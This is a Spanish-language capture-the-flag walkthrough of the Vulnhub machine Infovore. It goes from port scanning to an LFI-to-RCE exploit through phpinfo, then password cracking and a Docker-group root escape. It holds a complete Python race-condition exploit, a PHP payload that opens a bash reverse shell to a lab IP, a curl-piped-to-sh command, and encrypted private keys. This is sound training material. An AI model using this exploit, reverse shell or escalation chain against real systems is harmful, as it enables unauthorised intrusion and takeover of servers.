# Infovore - Vulnhub

## Reconocimiento

Vamos a hacer un barrido de la red para ver la IP de la máquina vulnerable

```bash
sudo arp-scan -I ens33 --localnet --ignoredups

192.168.0.41	00:0c:29:8e:6d:d5	VMware, Inc.
```

Ahora vamos a hacer un escaneo de puertos con nmap

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.0.41

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63
```

Veamos a mayor detalle el puerto 80

```bash
nmap -sCV -p80 192.168.0.41

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Include me ...
```

Vamos a la página http://192.168.0.41/

![alt text](image.png)

Vamos a hacer un escaneo de directorios con nmap

```bash
sudo nmap -p 80 --script http-enum 192.168.0.41

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|_  /info.php: Possible information file
```

Veamos que tecnología usa la página con whatweb

```bash
whatweb 'http://192.168.0.41/'

http://192.168.0.41/ [200 OK] Apache[2.4.38], Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.38 (Debian)], IP[192.168.0.41], JQuery, PHP[7.4.7], Script, Title[Include me ...], X-Powered-By[PHP/7.4.7]
```

Al entrar a info.php, vemos que disable_functions tiene no value, file_uploads está en On.

Para abusar de la vulnerabilidad de file upload, vamos a crear un archivo PHP con un webshell y subirlo mediante POST request. Para esto, vamos a usar Burp Suite para interceptar la petición y modificarla.

Pero para esto necesitamos primero un local file inclusion (LFI) para poder incluir el archivo que subamos. 

Esto va al directorio /tmp

```
Content-Type: multipart/form-data; boundary=--pwn

----pwn
Content-Disposition: form-data; name="archivo_subido"; filename="cmd.php"
Content-Type: application/x-php

<?php system(bash -c 'bash -i >& /dev/tcp/192.168.0.19/443 0>&1'); ?>

----pwn

```

Vamos a fuzzear http://192.168.0.41/index.php?FUZZ=/etc/passwd con wfuzz para encontrar un LFI.

```bash
wfuzz -t 200 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt --hc 404 --hl 136 -u "http://192.168.0.41/index.php?FUZZ=/etc/passwd"

000025370:   200        26 L     33 W       1006 Ch     "filename"
```

Probamos http://192.168.0.41/index.php?filename=/etc/passwd

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

Vamos a https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/LFI-to-RCE.md y en el apartado de "LFI to RCE via phpinfo()" Usamos este script:

Cambiamos al tipico oneliner y ponemos info.php en vez de phpinfo.php


```python
#!/usr/bin/python 
import sys
import threading
import socket

def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r
<?php system("bash -c 'bash -i >& /dev/tcp/192.168.0.19/443 0>&1'"); ?>
\r""" % TAG
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /info.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script   
    LFIREQ="""GET /index.php?filename=%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)

def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    

    s.connect((host, port))
    s2.connect((host, port))

    s.send(phpinforeq)
    d = ""
    while len(d) < offset:
        d += s.recv(offset)
    try:
        i = d.index("[tmp_name] =&gt")
        fn = d[i+17:i+31]
    except ValueError:
        return None

    s2.send(lfireq % (fn, host))
    d = s2.recv(4096)
    s.close()
    s2.close()

    if d.find(tag) != -1:
        return fn

counter=0
class ThreadWorker(threading.Thread):
    def __init__(self, e, l, m, *args):
        threading.Thread.__init__(self)
        self.event = e
        self.lock =  l
        self.maxattempts = m
        self.args = args

    def run(self):
        global counter
        while not self.event.is_set():
            with self.lock:
                if counter >= self.maxattempts:
                    return
                counter+=1

            try:
                x = phpInfoLFI(*self.args)
                if self.event.is_set():
                    break                
                if x:
                    print "\nGot it! Shell created in /tmp/g"
                    self.event.set()
                    
            except socket.error:
                return
    

def getOffset(host, port, phpinforeq):
    """Gets offset of tmp_name in the php output"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    s.send(phpinforeq)
    
    d = ""
    while True:
        i = s.recv(4096)
        d+=i        
        if i == "":
            break
        # detect the final chunk
        if i.endswith("0\r\n\r\n"):
            break
    s.close()
    i = d.find("[tmp_name] =&gt")
    if i == -1:
        raise ValueError("No php tmp_name in phpinfo output")
    
    print "found %s at %i" % (d[i:i+10],i)
    # padded up a bit
    return i+256

def main():
    
    print "LFI With PHPInfo()"
    print "-=" * 30

    if len(sys.argv) < 2:
        print "Usage: %s host [port] [threads]" % sys.argv[0]
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error, e:
        print "Error with hostname %s: %s" % (sys.argv[1], e)
        sys.exit(1)

    port=80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with port %d: %s" % (sys.argv[2], e)
        sys.exit(1)
    
    poolsz=10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError, e:
        print "Error with poolsz %d: %s" % (sys.argv[3], e)
        sys.exit(1)

    print "Getting initial offset...",  
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print "Spawning worker pool (%d)..." % poolsz
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print
        if e.is_set():
            print "Woot!  \m/"
        else:
            print ":("
    except KeyboardInterrupt:
        print "\nTelling threads to shutdown..."
        e.set()
    
    print "Shuttin' down..."
    for t in tp:
        t.join()

if __name__=="__main__":
    main()
```

Al ejecutar el script y ponernos en escucha con netcat, obtenemos una reverse shell en el puerto 443

![alt text](image-1.png)

```bash
script /dev/null -c bash
CTRL-Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 cols 184
```

```bash
www-data@e71b67461f6c:/var/www/html$ whoami
www-data

www-data@e71b67461f6c:/var/www/html$ cat .user.txt 
FLAG{Now_You_See_phpinfo_not_so_harmless}
```

Acabamos de conseguir la bandera del usuario.

## Escalada de privilegios

Vamos a escalar privilegios a root.

```bash
uname -a
Linux e71b67461f6c 3.16.0-6-amd64 #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08) x86_64 GNU/Linux
```

```bash
find / -perm -4000 2>/dev/null
# Nada interesante
```

Vamos a usar linpeas.sh para buscar vulnerabilidades de escalada de privilegios.

```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

╔══════════╣ Unexpected in root (T1083)
/.dockerenv
/core
/.oldkeys.tgz
```

Además vemos que estamos en un contennedor de Docker

Vemos que hay un archivo .oldkeys.tgz en el directorio raíz. Vamos a ver su contenido.

```bash
tar -xvzf .oldkeys.tgz

ls
root  root.pub

cat root
-----BEGIN DSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2037F380706D4511A1E8D114860D9A0E

ds7T1dLfxm7o0NC93POQLLjptTjMMFVJ4qxNlO2Xt+rBqgAG7YQBy6Tpj2Z2VxZb
uyMe0vMyIpN9jNFeOFbL42RYrMV0V50VTd/s7pYqrp8hHYWdX0+mMfKfoG8UaqWy
gBdYisUpRpmyVwG1zQQF1Tl7EnEWkH1EW6LOA9hGg6DrotcqWHiofiuNdymPtlN+
it/uUVfSli+BNRqzGsN01creG0g9PL6TfS0qNTkmeYpWxt7Y+/R+3pyaTBHG8hEe
zZcX24qvW1KY2ArpSSKYlXZw+BwR5CLk6S/9UlW4Gls9YRK7Jl4mzBGdtpP85a/p
fLowmWKRmqCw2EH87mZUKYaf02w1jbVWyjXOy8SwNCNr87zJstQpmgOISUc7Cknq
JEpv1kzXEVJCfeeA1163du4RFfETFauxALtKLylAqMs4bqcOJm1NVuHAmJdz4+VT
GRSmO/+B+LNLiGJm9/7aVFGi95kuoxFstIkG3HWVodYLE/FUbVqOjqsIBJxoK3rB
t75Yskdgr3QU9vkEGTZWbI3lYNrF0mDTiqNHKjsoiekhSaUBM80nAdEfHzSs2ySW
EQDd4Hf9/Ln3w5FThvUf+g==
-----END DSA PRIVATE KEY-----


hostname -I
192.168.150.21 

cat /proc/net/arp
192.168.150.1
```

De forma aislada a la IP 192.168.0.41 y la IP 192.168.150.21, dentro del contenedor tiene la IP 192.168.150.1

```bash
echo "" > /dev/tcp/192.168.150.1/80
echo "" > /dev/tcp/192.168.150.1/22
```

Estos 2 puertos me devuelven codigo de estado 0 por lo que están abiertos. El puerto 22 es el que nos interesa, ya que es el puerto de SSH.

```bash
python2.7 /usr/share/john/ssh2john.py id_rsa > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt

choclate93       (id_rsa)
```

Ahora en la reverse shell:

```bash
su root
# Password: choclate93

root@e71b67461f6c:/tmp# cd /root
root@e71b67461f6c:~# cat root.txt 
FLAG{Congrats_on_owning_phpinfo_hope_you_enjoyed_it}

And onwards and upwards!
```

```bash
cd ~/.ssh

cat id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDN/keLDJowDdeSdHZz26wS1M2o2/eiJ99+acchRJr0lZE0YmqbfoIo+n75VS+eLiT03yonunkVp+lhK+uey7/Tu8JsQSHK1F0gci5FG7MKRU4/+m+0CODwVFTNgw3E4FKg5qu+nt6BkBThU3Vnhe/Ujbp5ruNjb4pPajll2Pv5dyRfaRrn0DTnhpBdeXWdIhU9QQgtxzmUXed/77rV6m4AL4+iENigp3YcPOjF7zUG/NEop9c1wdGpjSEhv/ftjyKoazFEmOI1SGpD3k9VZlIUFs/uw6kRVDJlg9uxT4Pz0tIEMVizlV4oZgcEyOJ9NkSe6ePUAHG7F+v7VjbYdbVh admin@192.168.150.1

cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,7E18B5FC6317F2B108B324FAE966C522

7pImaaMpH87ki1cJP35Xnfv2dq8BxbRghs24GckdTRdG1ivgZX6e/DKj4mctEKiM
fWRJ4ewDg46Kt8sfyJYoz633vnSRfUPM7odqD52voaXLmS5y5KME0DZzzpwMm9b7
358IXVsrKYxCqczhbR+fZnSq3CoILv85faDCUo4B8n+lauzRKBPEoDgAK44Hn4w7
sW1nn3hNBJ2jz6J8UqX2r1Cf3JLOJ1LwO6J4jrhKmt4BNNFzIrNo9hCDM2MtIhwP
xp9Pi6PkPkPUJ+bClu9ULXqIPLJaBiPdek2fTSFyeLPUWTxT4hne06u2zqqUqR1h
8NI6cjyYkx0ytOjbN7EqdI5T7n6ouq21Va5yuhtwYd10TYkFJyE2yNqWZCJUxjqh
7TkZwbFjWk+aHjEYIuAmD3MmdqU0zf2tBFu4SqlBhMlB84fM3HCL3yG3krFSpRf+
QKuB7bBCTg46KPlz3EKloRFy/jAT8bm1AQAlpZKLUZ1V8LpLytLpG2x7dmhQ5wXW
WECqll7VOpMjh9H/I81THkJ3uXVMwA/nolD/4Zj8yU8u29wa7bpiYT8lZ0EmgxbP
Uh//hmqkltYa1xs017oBvm8qUlaWQrwiJd264QRzdUCuN3zHyLNYaOpJ/d/C9pBI
MAwSBpf11kW8ZswdADxUwgH+uCJkaPTiZXq+ABMzdJAN7XoCnI1U3o/HICKiHV8y
xyhXfxISh5ko63n2aerT4xlk4X6E7Y3Z80i7cxMXGVRWnMDaq9R0kMMtZCnxeRe5
TyZ3P7Vx2/kvvRyiMW87ywAwnGRrwWNcj877NYhRWbjmjA8qIGqKoqUKsvX5uxvz
MzD/Qs9VdMxiD6DotvDjQes29JHuhgKcKDEfUB9dlFWtPkX+18Mn8+C77DdkTgO3
krno3zmxzizW83HPXomM1oF2iLCiAsuP5n+hyk6rZ2QfVtIYhoUnfb7hUWkUxP+V
ARGt4JFulNdGaPiAaKddl0ghrs/SnDEhhqmZ7uIHall7WMeyLUaYe8GdgV7Q6FSh
sgVbw+JIdqf4ixWoYnhWnOPOiPW6/Qp3uX9HhbId5EpdRCPK94BRFQEDFja/8zD4
ubVsSi6ZQkAAfeP/AfimdM/LUf2m4h4SvzVacxykPUWMful6ZfTMjzZpA/us4a6O
kouPWP4/DNKRlG6LaakN1bb/jpiZeLgLy5+Vh/JsLw4Rb7e4wHAy4BkfcdBw9ioN
ywgm5JWXlKfGJl8qNZTe2Og+YO3YBWwHygHeKxxrimfTfNwUhK8RZxL6jGXYhFEe
gx4izyXIZj8Q5IpGbJvV9vP//IunuCEFgaQW+ONt7oqyRyokeAZWlMXabDSamVVN
5FthgNwLFRetfR5TS2y7A2YrskiBd213r7v4CoylTbG9K73G77ObmgL9e0fdTAof
x1WhIn5AJ8zD+0VUCad+OQoQz+VWElRf57/iEZhUufnJ+2pPV1Sa5RZltLearTNk
lbwqhInqV2L0oLmMz+cv2qED/HHGAVrJOtkO0EuyadtR0HdrHU+pc6bc12RvZPS5
oF8U8k12YpfGru/7ETn0oZzsZI3K1Et5hhwUmRmelahEfoYf8RNG1Cj4qWweCKp5
-----END RSA PRIVATE KEY-----
```

Vamos a crakear la contraseña de la clave privada con john the ripper y vemos que es `choclate93`. Ahora podemos conectarnos por SSH a la IP 192.168.150.1

```bash
ssh -i id_rsa admin@192.168.150.1

admin@infovore:~$ cat admin.txt 
FLAG{Escaped_from_D0ck3r}
admin@infovore:~$ id
uid=1000(admin) gid=1000(admin) groups=1000(admin),999(docker)
```

Estamos en el grupo docker, por lo que podemos ejecutar comandos como root. Vamos a ejecutar un bash como root mediante monturas de docker.

```bash
docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
theart42/infovore   latest              40de379c5116        6 years ago         428MB

docker run -dit -v /:/mnt/root --name privsec theart42/infovore

docker exec -it privsec bash
```

Ahora vamos a /mnt/root

```bash
root@8b042bec64e4:~# cd /mnt/root
root@8b042bec64e4:/mnt/root# ls
bin  boot  dev	etc  home  initrd.img  lib  lib64  lost+found  media  mnt  opt	proc  root  run  sbin  srv  sys  tmp  usr  var	vmlinuz
root@8b042bec64e4:/mnt/root# cd root/
root@8b042bec64e4:/mnt/root/root# ls
root.txt
root@8b042bec64e4:/mnt/root/root# cat root.txt 
 _____                             _       _                                              
/  __ \                           | |     | |                                             
| /  \/ ___  _ __   __ _ _ __ __ _| |_ ___| |                                             
| |    / _ \| '_ \ / _` | '__/ _` | __/ __| |                                             
| \__/\ (_) | | | | (_| | | | (_| | |_\__ \_|                                             
 \____/\___/|_| |_|\__, |_|  \__,_|\__|___(_)                                             
                    __/ |                                                                 
                   |___/                                                                  
__   __                                         _   _        __                         _ 
\ \ / /                                        | | (_)      / _|                       | |
 \ V /___  _   _   _ ____      ___ __   ___  __| |  _ _ __ | |_ _____   _____  _ __ ___| |
  \ // _ \| | | | | '_ \ \ /\ / / '_ \ / _ \/ _` | | | '_ \|  _/ _ \ \ / / _ \| '__/ _ \ |
  | | (_) | |_| | | |_) \ V  V /| | | |  __/ (_| | | | | | | || (_) \ V / (_) | | |  __/_|
  \_/\___/ \__,_| | .__/ \_/\_/ |_| |_|\___|\__,_| |_|_| |_|_| \___/ \_/ \___/|_|  \___(_)
                  | |                                                                     
                  |_|                                                                     
 
FLAG{And_now_You_are_done}

@theart42 and @4nqr34z
```